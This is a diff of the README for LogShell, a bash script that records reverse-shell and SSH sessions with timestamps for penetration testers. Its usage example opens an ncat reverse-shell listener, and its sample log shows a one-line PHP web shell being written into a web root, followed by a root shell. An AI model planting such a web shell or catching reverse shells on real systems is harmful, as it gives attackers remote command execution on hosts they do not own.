@@ -3,15 +3,18 @@
   <br/>
 </div>
 
-LogShell is bash script for logging network sessions established via netcat, such as reverse shells.
+LogShell is bash script for logging network sessions established via netcat or SSH, such as reverse shells.
 
 It ensures you always have a track of every command ran on a target to look back later.
 
 ## Features
 
-- Records netcat sessions with timestamped logging.
+- Records shell sessions with timestamped logging.
+- Support for Ncat and SSH.
+- Preserves color information of the recorded shell output.
 - Handles backspaces in user input for clean output.
 - Supports automatic detection and logging of session initiation.
+- Seamless chains with other tools such as proxychains and rlwrap.
 - Easy setup and usage.
 
 ## Usage
@@ -38,16 +41,19 @@ mv ./logshell /usr/bin
 
 5. Run the script with your netcat command:
 ```bash
-# Catching a reverse shell
-logshell ncat -lnvp 1337
+# Initiating SSH session logging
+logshell ssh user@127.0.0.1
+
+# Recording a reverse shell with Ncat and rlwrap
+logshell rlwrap ncat -lnvp 1337
 ```
 
-6. View the logs in /tmp/\<target-ip\>.log (log location can be customized within the script):
+6. View the logs in /tmp/\<target\>.log (log location can be customized within the script):
 ```
 ┌──(user㉿kali)-[~]
 └─$ cat /tmp/127.0.0.1.log
 =============================================================
-Shell session initiated at: 2024-05-30 19:48:41
+Shell session via SSH initiated at: 2024-05-30 19:48:41
 =============================================================
 (19:48:47) $ whoami
 (19:48:47) user
@@ -63,7 +69,7 @@ Shell session initiated at: 2024-05-30 19:48:41
 (19:49:50) $ echo '<?=`$_GET[1]`?>' > /var/www/html/web-shell.php
 (19:51:03) exit
 =============================================================
-Shell session initiated at: 2024-05-30 19:53:50
+Shell session via Ncat initiated at: 2024-05-30 19:53:50
 =============================================================
 (19:54:01) # id
 (19:54:01) uid=0(root) gid=0(root) groups=0(root)
@@ -75,7 +81,7 @@ Shell session initiated at: 2024-05-30 19:53:50
 
 ## Future Work
 
-- **Expand Compatibility:** Support additional clients and listeners like `socat`, `SSH` and `nc`.
+- **Expand Compatibility:** Support additional clients and listeners like `socat` and `nc`.
 
 - **Improve Command/Output Differentiation:** Enhance clarity between user input and listener output for better log readability.
 
